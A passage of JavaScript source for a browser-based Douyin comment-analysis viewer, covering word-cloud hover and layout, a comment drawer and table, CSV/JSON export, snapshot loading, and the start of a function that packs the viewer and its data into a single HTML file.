data-act=\"open-drawer\">查看全部 ${rec.count} 条 →</div>`;\n    tip.classList.remove('hidden');\n    positionTooltip(span);\n    tip.onmouseenter = () => clearTimeout(hideTipTimer);\n    tip.onmouseleave = () => hideTooltip();\n    const more = tip.querySelector('[data-act=\"open-drawer\"]');\n    if (more) more.addEventListener('click', (e) => { e.stopPropagation(); openDrawer(rec.word); });\n  }\n\n  function positionTooltip(span) {\n    const tip = $('#tooltip');\n    const r = span.getBoundingClientRect();\n    const tw = tip.offsetWidth, th = tip.offsetHeight;\n    const gap = 12;\n    // 悬浮框本身可点（样例评论 → 主页），所以要尽量别盖住词：鼠标进不到词上就会出现\n    // 「悬停 A 却显示 B 的框」。做法：在词云面板内试上/下/左/右四个位置，取压住词面积最小的。\n    const cloudRect = $('#cloud').getBoundingClientRect();\n    const wordRects = $$('.cw', $('#cloud')).map((el) => el.getBoundingClientRect());\n    const overlapArea = (x, y) => {\n      let sum = 0;\n      for (const w of wordRects) {\n        const ox = Math.min(x + tw, w.right + 4) - Math.max(x, w.left - 4);\n        const oy = Math.min(y + th, w.bottom + 4) - Math.max(y, w.top - 4);\n        if (ox > 0 && oy > 0) sum += ox * oy;\n      }\n      return sum;\n    };\n    const inside = (x, y) => x >= cloudRect.left + 4 && y >= cloudRect.top + 4 &&\n      x + tw <= cloudRect.right - 4 && y + th <= cloudRect.bottom - 4;\n    const clampTo = (v, lo, hi) => Math.max(lo, Math.min(v, hi));\n    const loX = cloudRect.left + 6, hiX = cloudRect.right - tw - 6;\n    const loY = cloudRect.top + 6, hiY = cloudRect.bottom - th - 6;\n    const cands = [\n      { x: r.left + r.width / 2 - tw / 2, y: r.top - th - gap },        // 上\n      { x: r.left + r.width / 2 - tw / 2, y: r.bottom + gap },          // 下\n      { x: r.right + gap + 2, y: r.top + r.height / 2 - th / 2 },       // 右\n      { x: r.left - tw - gap - 2, y: r.top + r.height / 2 - th / 2 },   // 左\n    ].map((c) => ({\n      x: clampTo(Math.round(c.x), loX, Math.max(loX, hiX)),\n      y: clampTo(Math.round(c.y), loY, Math.max(loY, hiY)),\n    }));\n    let best = null, bestScore = Infinity;\n    for (const c of cands) {\n      // 越界（词云面板放不下）优先扣分；再按压住词的总面积排序\n      const score = overlapArea(c.x, c.y) + (inside(c.x, c.y) ? 0 : 1e9);\n      if (score < bestScore) { bestScore = score; best = c; }\n    }\n    if (!best) return;\n    tip.style.left = best.x + 'px';\n    tip.style.top = best.y + 'px';\n  }\n\n  function hideTooltip() {\n    clearTimeout(hideTipTimer);\n    hideTipTimer = setTimeout(() => { $('#tooltip').classList.add('hidden'); }, 180);\n  }\n\n  function bindCloudHover() {\n    const cloud = $('#cloud');\n\n    function activate(span) {\n      const rec = state.wordMap.get(span.dataset.word);\n      if (!rec) return;\n      if (state.hoverWord !== rec.word) {\n        state.hoverWord = rec.word;\n        $$('.cw', cloud).forEach((el) => {\n          if (el === span) { el.classList.add('hot'); el.classList.remove('dim'); }\n          else { el.classList.add('dim'); el.classList.remove('hot'); }\n        });\n      }\n      showTooltip(span, rec);\n    }\n\n    cloud.addEventListener('mouseover', (e) => {\n      const span = e.target.closest('.cw');\n      if (!span) return;\n      activate(span);\n    });\n    // 兜底：tooltip 是浮在词云上的可点面板，会挡住它下面的词，光靠 mouseover 就会出现\n    // 「悬停 A 却显示 B 的框 / 悬停了不弹」。这里在 document 上按鼠标坐标做几何命中，\n    // 即使指针落在 tooltip 上，只要下面有词就切到那个词。\n    function clearHighlight() {\n      $$('.cw', cloud).forEach((el) => { el.classList.remove('hot'); el.classList.remove('dim'); });\n      state.hoverWord = '';\n    }\n    let moveRaf = 0;\n    let lastPt = null;\n    document.addEventListener('mousemove', (e) => {\n      lastPt = { x: e.clientX, y: e.clientY };\n      // 指针在抽屉里（抽屉会盖住词云右半边）时不要再去命中它背后的词，\n      // 否则翻抽屉时词云会莫名其妙地高亮。\n      const inDrawer = e.target && e.target.closest ? !!e.target.closest('#drawer') : false;\n      if (inDrawer) {\n        if (state.hoverWord) clearHighlight();\n        return;\n      }\n      if (moveRaf) return;\n      moveRaf = requestAnimationFrame(() => {\n        moveRaf = 0;\n        if (!lastPt) return;\n        const p = lastPt;\n        const spans = $$('.cw', cloud);\n        let hit = null;\n        for (const el of spans) {\n          const r = el.getBoundingClientRect();\n          if (p.x >= r.left && p.x <= r.right && p.y >= r.top && p.y <= r.bottom) { hit = el; break; }\n        }\n        // 指针不在任何词上（空处 / 悬浮框上）就必须把高亮清掉。\n        // 否则从悬浮框里移出来时，那个词没有 mouseout 事件，会一直亮着、别的词一直变淡，\n        // 看起来就是「没悬浮在词上却高亮了」。\n        if (!hit) {\n          if (state.hoverWord) clearHighlight();\n          return;\n        }\n        const tip = $('#tooltip');\n        if (state.hoverWord === hit.dataset.word && !tip.classList.contains('hidden')) return;\n        activate(hit);\n      });\n    });\n    document.addEventListener('mouseleave', () => {\n      clearHighlight();\n      hideTooltip();\n    });\n    cloud.addEventListener('mouseout', (e) => {\n      const span = e.target.closest('.cw');\n      if (!span) return;\n      const to = e.relatedTarget && e.relatedTarget.closest ? e.relatedTarget.closest('.cw') : null;\n      if (to === span) return;\n      span.classList.remove('hot');\n      if (!to) {\n        $$('.cw', cloud).forEach((el) => el.classList.remove('dim'));\n        state.hoverWord = '';\n      }\n      hideTooltip();\n    });\n    cloud.addEventListener('click', (e) => {\n      const span = e.target.closest('.cw');\n      if (!span) return;\n      openDrawer(span.dataset.word);\n    });\n  }\n\n  /* ===================== 侧栏关键词 ===================== */\n  function renderWordList() {\n    const list = $('#wordList');\n    const top = state.words.slice(0, 30);\n    const max = top.length ? top[0].count : 1;\n    $('#wordInfo').textContent = state.words.length ? `${state.words.length} 个词 · 点击看评论` : '';\n    if (!top.length) {\n      list.innerHTML = '<li class=\"muted small\" style=\"display:block;cursor:default\">暂无关键词</li>';\n      return;\n    }\n    list.innerHTML = top.map((w, i) => `\n      <li data-word=\"${esc(w.word)}\">\n        <span class=\"rank\">${i + 1}</span>\n        <span class=\"w\" title=\"${esc(w.word)}\">${esc(w.word)}</span>\n        <span class=\"n\">${w.count}</span>\n      </li>`).join('');\n  }\n\n  /* ===================== 抽屉 ===================== */\n  const drawer = { word: '', list: [], shown: 0, pageStep: 20 };\n\n  function commentsWithWord(word) {\n    const out = [];\n    const rec = state.wordMap.get(word);\n    for (const c of filtered()) {\n      if (!c.text) continue;\n      const has = rec && c.cid ? rec.cids.has(c.cid) : tokensOf(c.textClean || c.text).map(cleanToken).indexOf(word) >= 0;\n      if (has) out.push(c);\n    }\n    out.sort((a, b) => b.digg - a.digg);\n    return out;\n  }\n\n  function openDrawer(word) {\n    const list = commentsWithWord(word);\n    drawer.word = word;\n    drawer.list = list;\n    drawer.shown = 0;\n    $('#drawerTitle').textContent = '「' + word + '」';\n    $('#drawerSub').textContent = `${list.length} 条评论包含这个词（按点赞降序）`;\n    $('#drawerBody').innerHTML = '';\n    $('#drawer').classList.remove('hidden');\n    $('#tooltip').classList.add('hidden');\n    renderDrawerMore();\n  }\n\n  function renderDrawerMore() {\n    const body = $('#drawerBody');\n    const next = drawer.list.slice(drawer.shown, drawer.shown + drawer.pageStep);\n    if (!drawer.shown && !drawer.list.length) {\n      body.innerHTML = '<div class=\"empty small\">没有找到包含这个词的评论</div>';\n    }\n    const frag = document.createElement('div');\n    frag.innerHTML = next.map((c) => {\n      const href = profileOf(c.user);\n      const go = href\n        ? `<a class=\"dc-go\" href=\"${esc(href)}\" target=\"_blank\" rel=\"noopener noreferrer\">打开主页 ↗</a>`\n        : '<span class=\"dc-go off\" title=\"导出数据里没有 sec_uid\">无主页信息</span>';\n      const badges = [\n        c.isHot ? '<span class=\"badge hot\">热评</span>' : '',\n        c.isReply ? '<span class=\"badge reply\">回复</span>' : '',\n        c.isFolded ? '<span class=\"badge fold\">折叠</span>' : '',\n      ].join('');\n      return `<div class=\"dc\">\n        <div class=\"dc-head\">\n          <div class=\"dc-user\">\n            <span class=\"avatar\" style=\"${esc(avatarStyle(c.user))}\">${esc(initials(c.user.nickname))}</span>\n            <div class=\"user-meta\">\n              <span class=\"user-name\">${esc(c.user.nickname)}</span>\n              <span class=\"user-sub\">${esc(c.user.uniqueId || (c.user.shortId ? 'ID ' + c.user.shortId : 'ID ' + String(c.user.uid || '').slice(-8)))}</span>\n            </div>\n          </div>\n          ${go}\n        </div>\n        <div class=\"dc-text\">${esc(c.text || '（无文字）')}</div>\n        <div class=\"dc-meta\">\n          <span>赞 ${fmtNum(c.digg)}</span>\n          <span>回复 ${fmtNum(c.replies)}</span>\n          ${c.ip ? `<span>属地 ${esc(c.ip)}</span>` : ''}\n          <span>${esc(c.createTimeStr || fmtTimeShort(c.createTime))}</span>\n          <span class=\"spacer\"></span>\n          ${badges}\n        </div>\n      </div>`;\n    }).join('');\n    while (frag.firstChild) body.appendChild(frag.firstChild);\n    drawer.shown += next.length;\n    const more = $('#btnDrawerMore');\n    more.disabled = drawer.shown >= drawer.list.length;\n    more.textContent = drawer.shown >= drawer.list.length\n      ? `已全部显示（${drawer.list.length} 条）`\n      : `加载更多（还有 ${drawer.list.length - drawer.shown} 条）`;\n  }\n\n  function closeDrawer() { $('#drawer').classList.add('hidden'); }\n\n  /* ===================== 表格 ===================== */\n  function sortList(list) {\n    const arr = list.slice();\n    const by = state.sort;\n    if (by === 'digg') arr.sort((a, b) => b.digg - a.digg || b.createTime - a.createTime);\n    else if (by === 'time') arr.sort((a, b) => b.createTime - a.createTime || b.digg - a.digg);\n    else if (by === 'len') arr.sort((a, b) => b.text.length - a.text.length || b.digg - a.digg);\n    else if (by === 'replies') arr.sort((a, b) => b.replies - a.replies || b.digg - a.digg);\n    return arr;\n  }\n\n  function highlight(text, q) {\n    if (!q) return esc(text);\n    const lower = text.toLowerCase();\n    let idx = lower.indexOf(q);\n    if (idx === -1) return esc(text);\n    let out = '', i = 0;\n    while (idx !== -1) {\n      out += esc(text.slice(i, idx)) + '<span class=\"hl\">' + esc(text.slice(idx, idx + q.length)) + '</span>';\n      i = idx + q.length;\n      idx = lower.indexOf(q, i);\n    }\n    out += esc(text.slice(i));\n    return out;\n  }\n\n  function sentBadge(c) {\n    const l = (c.sentiment && c.sentiment.label) || 'neu';\n    return '<span class=\"sbadge ' + l + '\" title=\"词典打分 ' + ((c.sentiment && c.sentiment.score) || 0) + '\">' + SENT_LABEL[l] + '</span>';\n  }\n\n  function renderTable() {\n    const list = sortList(filtered());\n    const total = list.length;\n    const pages = Math.max(1, Math.ceil(total / state.pageSize));\n    if (state.page > pages) state.page = pages;\n    const start = (state.page - 1) * state.pageSize;\n    const rows = list.slice(start, start + state.pageSize);\n    const q = state.filters.search.trim().toLowerCase();\n    const tbody = $('#tbody');\n    tbody.innerHTML = rows.map((c) => {\n      const href = profileOf(c.user);\n      const nameHtml = highlight(c.user.nickname, q);\n      const userCell = `<div class=\"user-cell\">\n        <span class=\"avatar\" style=\"${esc(avatarStyle(c.user))}\">${esc(initials(c.user.nickname))}</span>\n        <div class=\"user-meta\">\n          ${href ? `<a class=\"user-name\" href=\"${esc(href)}\" target=\"_blank\" rel=\"noopener noreferrer\" title=\"打开抖音主页\">${nameHtml}</a>`\n                 : `<span class=\"user-name nolink\" title=\"导出数据里没有 sec_uid，无法拼主页\">${nameHtml}</span>`}\n          <span class=\"user-sub\">${esc(c.user.uniqueId || (c.user.shortId ? 'ID ' + c.user.shortId : ''))}</span>\n        </div>\n      </div>`;\n      const badges = `<span class=\"badges\">\n        ${c.isHot ? '<span class=\"badge hot\">热</span>' : ''}\n        ${c.isReply ? '<span class=\"badge reply\">回复</span>' : ''}\n        ${c.isFolded ? '<span class=\"badge fold\">折叠</span>' : ''}\n      </span>`;\n      return `<tr>\n        <td class=\"cell-text\"><div class=\"txt\">${highlight(c.text || '（无文字）', q)}${badges}</div>\n          ${c.videoTitle && !state.filters.videoId ? `<div class=\"muted small\" style=\"margin-top:4px\"><a class=\"video-link\" href=\"${esc(videoUrl(c.videoId))}\" target=\"_blank\" rel=\"noopener noreferrer\" title=\"在原视频页打开这条视频\">${esc(c.videoTitle)} ↗</a></div>` : ''}\n        </td>\n        <td data-label=\"用户\">${userCell}</td>\n        <td class=\"num\" data-label=\"点赞\">${fmtNum(c.digg)}</td>\n        <td class=\"num\" data-label=\"回复\">${fmtNum(c.replies)}</td>\n        <td class=\"muted\" data-label=\"属地\">${esc(c.ip || '-')}</td>\n        <td class=\"muted small\" data-label=\"时间\">${esc(c.createTimeStr ? c.createTimeStr.slice(0, 16) : fmtTime(c.createTime))}</td>\n        <td class=\"muted small\" data-label=\"层级\">${c.isReply ? '二级' : '一级'}</td>\n        <td class=\"cell-sent\" data-label=\"情感\">${sentBadge(c)}</td>\n      </tr>`;\n    }).join('');\n    $('#tableEmpty').classList.toggle('hidden', rows.length > 0);\n    $('#tableCount').textContent = `（${total} 条${state.filters.search ? '，含搜索「' + state.filters.search + '」' : ''}）`;\n    $('#btnExport').disabled = total === 0;\n    if ($('#btnExportJson')) $('#btnExportJson').disabled = total === 0;\n    renderPager(pages, total);\n  }\n\n  function renderPager(pages, total) {\n    const pager = $('#pager');\n    const cur = state.page;\n    const btns = [];\n    btns.push(`<button type=\"button\" data-page=\"1\" ${cur === 1 ? 'disabled' : ''}>« 首页</button>`);\n    btns.push(`<button type=\"button\" data-page=\"${cur - 1}\" ${cur === 1 ? 'disabled' : ''}>‹ 上一页</button>`);\n    const from = Math.max(1, cur - 3), to = Math.min(pages, from + 6);\n    for (let p = from; p <= to; p++) {\n      btns.push(`<button type=\"button\" data-page=\"${p}\" class=\"${p === cur ? 'on' : ''}\">${p}</button>`);\n    }\n    btns.push(`<button type=\"button\" data-page=\"${cur + 1}\" ${cur === pages ? 'disabled' : ''}>下一页 ›</button>`);\n    btns.push(`<button type=\"button\" data-page=\"${pages}\" ${cur === pages ? 'disabled' : ''}>末页 »</button>`);\n    pager.innerHTML = btns.join('') + `<span class=\"info\">第 ${cur} / ${pages} 页 · 共 ${total} 条</span>`;\n  }\n\n  /* ===================== 导出 ===================== */\n  function csvCell(v) {\n    const s = String(v == null ? '' : v);\n    return /[\",\\r\\n]/.test(s) ? '\"' + s.replace(/\"/g, '\"\"') + '\"' : s;\n  }\n\n  const EXPORT_COLS = [\n    ['cid', '评论ID'], ['video_id', '视频ID'], ['video_title', '视频标题'], ['text', '评论内容'],\n    ['user_nickname', '用户昵称'], ['user_unique_id', '抖音号'], ['user_sec_uid', 'sec_uid(主页链接用)'],\n    ['digg_count', '点赞数'], ['reply_comment_total', '回复数'], ['ip_label', '属地'],\n    ['create_time_str', '发布时间'], ['level', '层级(1一级/2二级)'],\n    ['sentiment', '情感(正向/中性/负向)'], ['topic', '主题'],\n  ];\n\n  function topicLabelOf(c) {\n    const t = state.topics && state.topics[c.topic];\n    return t ? t.label : '';\n  }\n\n  function exportRows() {\n    const list = sortList(filtered());\n    if (!list.length) { toast('没有可导出的评论'); return null; }\n    return list;\n  }\n\n  function download(blob, name) {\n    const a = document.createElement('a');\n    a.href = URL.createObjectURL(blob);\n    a.download = name;\n    document.body.appendChild(a);\n    a.click();\n    setTimeout(() => { URL.revokeObjectURL(a.href); a.remove(); }, 1500);\n  }\n\n  function stamp() { return new Date().toISOString().slice(0, 19).replace(/[:T]/g, '-'); }\n\n  // 导出 CSV：第 1 行英文键（给程序读），第 2 行中文说明（给 Excel 里的人看，首格带 # 标记）\n  function exportFilteredCsv() {\n    const list = exportRows();\n    if (!list) return;\n    const rows = [EXPORT_COLS.map((c) => c[0]).join(',')];\n    rows.push(EXPORT_COLS.map((c, i) => (i === 0 ? '# ' : '') + c[1]).join(','));\n    for (const c of list) {\n      rows.push([\n        csvCell(c.cid), csvCell(c.videoId), csvCell(c.videoTitle), csvCell(c.text),\n        csvCell(c.user.nickname), csvCell(c.user.uniqueId), csvCell(c.user.secUid),\n        csvCell(c.digg), csvCell(c.replies), csvCell(c.ip), csvCell(c.createTimeStr || fmtTime(c.createTime)),\n        csvCell(c.isReply ? 2 : 1),\n        csvCell(SENT_LABEL[(c.sentiment && c.sentiment.label) || 'neu']),\n        csvCell(topicLabelOf(c)),\n      ].join(','));\n    }\n    download(new Blob(['\\uFEFF' + rows.join('\\r\\n') + '\\r\\n'], { type: 'text/csv;charset=utf-8' }), 'comments-view-' + stamp() + '.csv');\n    toast(`已导出 ${list.length} 条评论（CSV）`);\n  }\n\n  // 导出 JSON：meta + comments（与采集插件导出的 JSON 结构接近，方便再喂给别的工具）\n  function exportFilteredJson() {\n    const list = exportRows();\n    if (!list) return;\n    const vids = Array.from(new Set(list.map((c) => String(c.videoId))));\n    const payload = {\n      exportedAt: new Date().toISOString(),\n      count: list.length,\n      filters: {\n        videoId: state.filters.videoId || '',\n        search: state.filters.search || '',\n        onlyHasProfile: !!state.filters.onlyHasProfile,\n        onlyTopLevel: !!state.filters.onlyTopLevel,\n        onlyNonEmpty: !!state.filters.onlyNonEmpty,\n        sortBy: state.filters.sortBy || 'digg',\n      },\n      videos: vids.map((id) => ({ videoId: id, title: (state.videos.get(id) || {}).title || '' })),\n      comments: list.map((c) => ({\n        cid: c.cid, videoId: c.videoId, videoTitle: c.videoTitle,\n        text: c.text, textClean: c.textClean, createTime: c.createTime, createTimeStr: c.createTimeStr,\n        diggCount: c.digg, replyCommentTotal: c.replies, ipLabel: c.ip,\n        level: c.isReply ? 2 : 1, isReply: !!c.isReply, isHot: !!c.isHot, isFolded: !!c.isFolded,\n        sentiment: (c.sentiment && c.sentiment.label) || 'neu',\n        sentimentScore: (c.sentiment && c.sentiment.score) || 0,\n        topic: topicLabelOf(c),\n        user: { nickname: c.user.nickname, uid: c.user.uid, secUid: c.user.secUid, uniqueId: c.user.uniqueId, shortId: c.user.shortId },\n      })),\n    };\n    download(new Blob([JSON.stringify(payload, null, 2)], { type: 'application/json;charset=utf-8' }), 'comments-view-' + stamp() + '.json');\n    toast(`已导出 ${list.length} 条评论（JSON）`);\n  }\n\n  /* ===================== 刷新 ===================== */\n  function recomputeWords(list) {\n    state.words = buildWords(list);\n    state.wordMap = new Map(state.words.map((w) => [w.word, w]));\n  }\n\n  let layoutSeq = 0;\n  function renderCloud() {\n    const cloud = $('#cloud');\n    if (!state.comments.length) { cloud.innerHTML = ''; return; }\n    const size = Number($('#cloudSize').value) || 120;\n    const words = state.words.slice(0, size).filter((w) => w.count >= 2 || state.words.length < 40);\n    const use = words.length ? words : state.words.slice(0, size);\n    const seq = ++layoutSeq;\n    // 等一帧，保证 cloud 已按最新尺寸布局\n    requestAnimationFrame(() => {\n      if (seq !== layoutSeq) return;\n      layoutCloud(use, cloud);\n      state.cloudReady = true;\n    });\n  }\n\n  function refreshAll() {\n    // v3.0：先给全部评论打情感分（筛选按它走），再在“基础筛选”集合上做主题聚类，\n    // 最后按当前筛选渲染表格 / KPI / 洞察。\n    annotateSentiment(state.comments);\n    const base = baseFiltered();\n    buildTopics(base);\n    const list = filtered();\n    recomputeWords(list);\n    renderKpis(list);\n    renderInsights(list);\n    renderTopicFilter();\n    renderVideoFilter();\n    renderWordList();\n    renderCloud();\n    $('#cloudSub').textContent = state.words.length\n      ? `${state.words.length} 个词 · ${fmtNum(list.length)} 条评论`\n      : '';\n    state.page = 1;\n    renderTable();\n  }\n\n  /* ===================== 事件绑定 ===================== */\n  function bindEvents() {\n    $('#btnOpenFiles').addEventListener('click', () => $('#fileInput').click());\n    const btnOpenFiles2 = $('#btnOpenFiles2');\n    if (btnOpenFiles2) btnOpenFiles2.addEventListener('click', () => $('#fileInput').click());\n    $('#btnOpenDir').addEventListener('click', () => $('#dirInput').click());\n    $('#fileInput').addEventListener('change', (e) => { loadFiles(e.target.files); e.target.value = ''; });\n    $('#dirInput').addEventListener('change', (e) => { loadFiles(e.target.files); e.target.value = ''; });\n\n    $('#btnClear').addEventListener('click', () => {\n      state.comments = [];\n      state.videos = new Map();\n      state.sources = [];\n      state.words = [];\n      state.wordMap = new Map();\n      state.page = 1;\n      state.filters.videoId = '';\n      state.filters.search = '';\n      $('#search').value = '';\n      updateEmptyState();\n      updateScope();\n      refreshAll();\n      $('#btnClear').disabled = true;\n      $('#cloudEmpty').classList.remove('hidden');\n      $('#tableEmpty').classList.remove('hidden');\n      $('#videoFilter').innerHTML = '';\n      $('#btnOpenVideo').disabled = true;\n      $('#btnOpenVideo').dataset.videoId = '';\n      closeDrawer();\n      toast('已清空');\n    });\n\n    $('#cloudSize').addEventListener('change', () => { renderCloud(); });\n    $('#btnRelayout').addEventListener('click', () => { renderCloud(); toast('已重新排布'); });\n\n    // 「打开原视频 ↗」：新标签页打开当前选中视频的抖音页面\n    $('#btnOpenVideo').addEventListener('click', () => {\n      const btn = $('#btnOpenVideo');\n      const id = btn.dataset.videoId || state.filters.videoId;\n      const url = videoUrl(id);\n      if (!url) { toast('先选择一条视频'); return; }\n      window.open(url, '_blank', 'noopener');\n    });\n\n    $('#wordList').addEventListener('click', (e) => {\n      const li = e.target.closest('li[data-word]');\n      if (!li) return;\n      openDrawer(li.dataset.word);\n    });\n\n    $('#videoFilter').addEventListener('change', (e) => {\n      state.filters.videoId = e.target.value;\n      state.filters.topic = '';\n      refreshAll();\n    });\n    const sentSel = $('#sentFilter');\n    if (sentSel) sentSel.addEventListener('change', (e) => { state.filters.sentiment = e.target.value; refreshAll(); });\n    const topicSel = $('#topicFilter');\n    if (topicSel) topicSel.addEventListener('change', (e) => { state.filters.topic = e.target.value; state.page = 1; refreshAll(); });\n    const insights = $('#insights');\n    if (insights) {\n      insights.addEventListener('click', (e) => {\n        const t = e.target.closest('[data-topic]');\n        if (t) { state.filters.topic = t.dataset.topic; state.page = 1; refreshAll(); return; }\n        const w = e.target.closest('[data-topic-word]');\n        if (w) { $('#search').value = w.dataset.topicWord; state.filters.search = w.dataset.topicWord; state.page = 1; renderTable(); document.querySelector('.table-panel').scrollIntoView({ behavior: 'smooth', block: 'start' }); return; }\n        const n = e.target.closest('[data-neg-cid]');\n        if (n) {\n          const c = state.comments.find((x) => x.cid === n.dataset.negCid);\n          if (c) toast((SENT_LABEL[(c.sentiment && c.sentiment.label) || 'neu']) + '：' + (c.text || '（无文字）').slice(0, 80));\n        }\n      });\n    }\n    ['onlyHasProfile', 'onlyTopLevel', 'onlyNonEmpty', 'onlyContent'].forEach((id) => {\n      $('#' + id).addEventListener('change', (e) => {\n        state.filters[id] = e.target.checked;\n        refreshAll();\n      });\n    });\n\n    // v0.5.41：自定义加词 / 屏蔽词（逗号或空格分隔，改完 400ms 自动生效并记忆）\n    const kwKeepEl = $('#kwKeep'), kwBlockEl = $('#kwBlock');\n    if (kwKeepEl) kwKeepEl.value = (state.kwKeep || []).join(',');\n    if (kwBlockEl) kwBlockEl.value = (state.kwBlock || []).join(',');\n    const onKwTune = debounce(applyWordLists, 400);\n    if (kwKeepEl) kwKeepEl.addEventListener('input', onKwTune);\n    if (kwBlockEl) kwBlockEl.addEventListener('input', onKwTune);\n\n    const onSearch = debounce(() => {\n      state.filters.search = $('#search').value;\n      state.page = 1;\n      renderTable();\n    }, 200);\n    $('#search').addEventListener('input', onSearch);\n\n    $('#sortBy').addEventListener('change', (e) => {\n      state.sort = e.target.value;\n      state.page = 1;\n      renderTable();\n    });\n\n    $('#pager').addEventListener('click', (e) => {\n      const btn = e.target.closest('button[data-page]');\n      if (!btn) return;\n      state.page = Number(btn.dataset.page) || 1;\n      renderTable();\n      document.querySelector('.table-panel').scrollIntoView({ behavior: 'smooth', block: 'start' });\n    });\n\n    $('#btnExport').addEventListener('click', exportFilteredCsv);\n    $('#btnExportJson').addEventListener('click', exportFilteredJson);\n\n    $('#btnCloseDrawer').addEventListener('click', closeDrawer);\n    $('#btnDrawerMore').addEventListener('click', renderDrawerMore);\n    $('#btnDrawerFilter').addEventListener('click', () => {\n      const w = drawer.word;\n      if (!w) return;\n      $('#search').value = w;\n      state.filters.search = w;\n      state.page = 1;\n      closeDrawer();\n      renderTable();\n      document.querySelector('.table-panel').scrollIntoView({ behavior: 'smooth', block: 'start' });\n      toast('已在评论表里筛选「' + w + '」');\n    });\n\n    window.addEventListener('resize', debounce(() => {\n      if (!state.comments.length) return;\n      renderCloud();\n    }, 260));\n\n    // 拖拽文件到页面\n    document.addEventListener('dragover', (e) => { e.preventDefault(); });\n    document.addEventListener('drop', (e) => {\n      e.preventDefault();\n      if (e.dataTransfer && e.dataTransfer.files && e.dataTransfer.files.length) loadFiles(e.dataTransfer.files);\n    });\n\n    window.addEventListener('keydown', (e) => {\n      if (e.key === 'Escape') {\n        closeDrawer();\n        $('#tooltip').classList.add('hidden');\n      }\n    });\n\n    bindCloudHover();\n  }\n\n  /* ===================== 启动 ===================== */\n  // 单文件快照（插件「导出词云」生成的自包含 HTML）会在加载本脚本前塞入\n  //   window.__CW_BOOT__ = { title, exportedAt, docs: [<导出 JSON 对象>, …] }\n  // 这里把它当成本地文件一样读进来，用户双击 HTML 就能看词云，不用再选文件。\n  function bootFromSnapshot() {\n    const boot = window.__CW_BOOT__;\n    if (!boot || !Array.isArray(boot.docs) || !boot.docs.length) return false;\n    let total = 0;\n    boot.docs.forEach((doc, i) => {\n      try {\n        const name = (doc && doc.__name) || `快照-${i + 1}.json`;\n        const n = ingestJson(JSON.stringify(doc), name);\n        if (n > 0) { total += n; state.sources.push(name); }\n      } catch (e) { console.warn('快照读取失败', e); }\n    });\n    if (!total) return false;\n    if (boot.title) document.title = boot.title;\n    updateScope();\n    updateEmptyState();\n    $('#btnClear').disabled = false;\n    refreshAll();\n    toast(`词云快照：${total} 条评论${boot.exportedAt ? '（导出于 ' + String(boot.exportedAt).slice(0, 16).replace('T', ' ') + '）' : ''}`);\n    return true;\n  }\n\n  function init() {\n    bindEvents();\n    renderWordList();\n    updateEmptyState();\n    updateScope();\n    // 快照优先：自带数据时不再走 ?data= 自动载入\n    if (bootFromSnapshot()) return console.log('%c评论分析台（快照模式）已就绪', 'color:#e0a94a;font-weight:600');\n\n    // 若页面地址带 ?data=<url 或 相对路径>，尝试自动载入（便于本地服务直接打开）\n    try {\n      const params = new URLSearchParams(location.search);\n      const auto = params.get('data');\n      if (auto) {\n        fetch(auto, { cache: 'no-store' }).then((r) => {\n          if (!r.ok) throw new Error('HTTP ' + r.status);\n          return r.text();\n        }).then((text) => {\n          const n = /\\.csv($|\\?)/i.test(auto) ? ingestCsv(text, auto.split('/').pop()) : ingestJson(text, auto.split('/').pop());\n          if (n > 0) {\n            state.sources.push(auto);\n            updateScope();\n            updateEmptyState();\n            $('#btnClear').disabled = false;\n            refreshAll();\n            toast(`自动载入 ${n} 条评论`);\n          }\n        }).catch((err) => {\n          console.warn('自动载入失败', err);\n          toast('自动载入失败：' + err.message + '（可手动选文件）');\n        });\n      }\n    } catch (e) { /* ignore */ }\n    console.log('%c评论分析台已就绪', 'color:#e0a94a;font-weight:600', '· 选择导出的 JSON/CSV 即可');\n  }\n\n  // 便于自动化测试 / 二次开发\n  window.CommentViewer = {\n    cleanToken,\n    applyWordLists,\n    setWordLists: (keep, block) => {\n      state.kwKeep = parseWordList(keep);\n      state.kwBlock = parseWordList(block);\n      const k = $('#kwKeep'), b = $('#kwBlock');\n      if (k) k.value = state.kwKeep.join(',');\n      if (b) b.value = state.kwBlock.join(',');\n      refreshAll();\n    },\n    state,\n    loadFiles,\n    ingestJson,\n    ingestCsv,\n    filtered,\n    buildWords,\n    tokensOf,\n    profileOf,\n    videoUrl,\n    openDrawer,\n    closeDrawer,\n    renderTable,\n    refreshAll,\n    EXPORT_COLS,\n    exportRows,\n    topicLabelOf,\n    sentimentOf,\n    annotateSentiment,\n    sentimentStats,\n    buildTopics,\n    renderInsights,\n    syncInsightHeights,\n    baseFiltered,\n    SENT_LABEL,\n    exportFilteredCsv,\n    exportFilteredJson,\n    healthOf, renderHealth,\n  };\n\n  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', init);\n  else init();\n})();\n", // 词云页 app.js
};
/* === END VIEWER ASSETS === */

// ---------- 导出词云（v0.5.30） ----------
// 把选中的视频评论打包成一个**自包含 HTML**：词云页的 html/css/js 已内嵌在 VIEWER_ASSETS 里，
// 这里把评论数据塞进 window.__CW_BOOT__、替换掉 <link> 与 <script src> 两个标签。
// 下载下来是一个单文件，双击就能看词云；发给别人不用装扩展、不用起服务（纯前端，数据不出本机）。
function buildCloudHtml(docs, title) {
  const boot = { exportedAt: new Date().toISOString(), title: title || '评论词云快照', docs };
  const bootJson = JSON.stringify(boot).replace(/</g, '\\u003c');
  // 替换值必须写成函数：字符串替换里 `$$` 会被当成转义变成 `$`，
  // 而词云页 js 里到处是 `$$(sel)`，用字符串会把代码改坏。
  // v0.5.50：分析台给资源加了 ?v=<版本> 防缓存，这里用正则容忍 query，否则替换不中
  // （不中就会落盘成一个 9KB 的空壳 HTML：没有内联样式/脚本、也没有 __CW_BOOT__）。
  return VIEWER_ASSETS.html
    .replace(/<link rel="stylesheet" href="styles\.css(?:\?[^"]*)?">/, () => '<style>\n' + VIEWER_ASSETS.css + '\n</style>')
    .replace(/<script src="app\.js(?:\?[^"]*)?"><\/script>/, () => '<script>window.__CW_BOOT__=' + bootJson + ';</script>\n<script>\n' + VIEWER_ASSETS.js + '\n</script>')
    .replace('<title>', '<title>词云快照 · ');
}

// v0.5.46：把「打包词云 HTML」抽成公共函数，面板直接开新标签页、AI/MCP 仍然落盘
async function buildCloudPayload(opts) {
  const o = opts || {};
  const pickIds = Array.isArray(o.videoIds)
    ? Array.from(new Set(o.videoIds.map((x) => String(x || '').trim()).filter(Boolean)))
    : (o.videoId ? [String(o.videoId)] : []);
  if (!pickIds.length) {
